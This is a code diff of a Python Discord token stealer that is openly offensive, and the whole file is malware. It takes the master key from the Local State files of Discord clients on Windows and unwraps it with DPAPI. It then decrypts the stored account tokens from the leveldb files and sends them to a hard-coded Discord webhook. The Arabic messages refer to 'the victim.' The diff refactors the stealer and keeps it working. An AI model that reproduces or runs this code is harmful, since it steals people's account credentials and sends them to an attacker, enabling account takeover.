@@ -5,79 +5,63 @@ import base64
 import requests
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-import shutil
-import tempfile
 
-# حط الويبهوك حقك هنا
-WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr"
+WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr"
 
-def get_master_key():
-    paths = [
-        os.path.join(os.getenv('APPDATA'), 'discord', 'Local State'),
-        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local State'),
-        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local State'),
-        os.path.join(os.getenv('APPDATA'), 'Lightcord', 'Local State'),
-    ]
-    for path in paths:
-        if not os.path.exists(path): continue
-        with open(path, 'r', encoding='utf-8') as f:
-            local_state = json.load(f)
-        master_key = local_state.get('os_crypt', {}).get('encrypted_key')
-        if master_key:
-            master_key = base64.b64decode(master_key)[5:] # إزالة DPAPI
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
-    return None
-
-def decrypt_token(encrypted_token, master_key):
-    try:
-        iv = encrypted_token[3:15]
-        payload = encrypted_token[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode() # إزالة التاق
-        return decrypted_pass
-    except:
-        return None
-
-def extract_tokens_from_leveldb():
-    master_key = get_master_key()
-    if not master_key: return []
+def get_tokens():
+    paths = {
+        'Discord': os.getenv('APPDATA') + '\\discord',
+        'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
+        'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
+        'Lightcord': os.getenv('APPDATA') + '\\Lightcord',
+    }
 
     tokens = []
-    discord_paths = [
-        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
-    ]
-
-    for path in discord_paths:
+    for name, path in paths.items():
         if not os.path.exists(path): continue
-        for file_name in os.listdir(path):
+        local_state_path = os.path.join(path, 'Local State')
+        if not os.path.exists(local_state_path): continue
+
+        try:
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            key = local_state.get('os_crypt', {}).get('encrypted_key')
+            if not key: continue
+            key = base64.b64decode(key)[5:]
+            master_key = CryptUnprotectData(key, None, None, None, 0)[1]
+        except:
+            continue
+
+        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
+        if not os.path.exists(leveldb_path): continue
+
+        for file_name in os.listdir(leveldb_path):
             if not file_name.endswith(('.ldb', '.log')): continue
-            file_path = os.path.join(path, file_name)
+            file_path = os.path.join(leveldb_path, file_name)
             try:
                 with open(file_path, 'rb') as f:
                     content = f.read()
-                # البحث عن النمط: dQw4w9WgXcQ:
                 for match in re.finditer(rb'dQw4w9WgXcQ:', content):
-                    start = match.end()
-                    encrypted = content[start:start+100]
-                    decrypted = decrypt_token(encrypted, master_key)
-                    if decrypted and re.match(r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}', decrypted):
-                        tokens.append(decrypted)
+                    encrypted = content[match.end():match.end()+150]
+                    try:
+                        iv = encrypted[3:15]
+                        payload = encrypted[15:]
+                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                        decrypted = cipher.decrypt(payload)[:-16].decode()
+                        if re.match(r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}', decrypted):
+                            tokens.append(f"[{name}] {decrypted}")
+                    except: pass
             except: pass
     return list(set(tokens))
 
-def send_to_webhook(tokens):
+def main():
+    tokens = get_tokens()
     if not tokens:
-        msg = "❌ لم يتم العثور على توكنات (الضحية غير مسجل دخول أو التوكن غير موجود)."
-    else:
-        msg = f"✅ تم استخراج {len(tokens)} توكن:\n```\n" + "\n".join(tokens) + "\n```"
+        requests.post(WEBHOOK, json={"content": "❌ لم يتم العثور على توكنات. تأكد أن ديسكورد مفتوح ومسجل دخول."})
+        return
     
-    data = {"content": msg}
-    requests.post(WEBHOOK_URL, json=data)
+    msg = f"✅ تم استخراج {len(tokens)} توكن:\n```\n" + "\n".join(tokens) + "\n```"
+    requests.post(WEBHOOK, json={"content": msg})
 
 if __name__ == "__main__":
-    tokens = extract_tokens_from_leveldb()
-    send_to_webhook(tokens)
+    main()
